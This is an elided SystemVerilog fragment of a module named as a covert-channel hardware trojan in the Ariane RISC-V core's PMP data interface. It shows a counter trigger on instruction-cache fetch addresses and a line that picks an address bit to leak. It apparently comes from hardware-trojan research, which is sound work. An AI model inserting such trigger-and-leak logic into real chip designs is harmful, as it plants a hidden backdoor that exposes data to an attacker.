...
module pmp_data_if_trojan_Covert
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19518;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (icache_fetch_vaddr_i) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = icache_fetch_vaddr_i[covert_bit_index];  // <-- FIXED: use trigger_signal
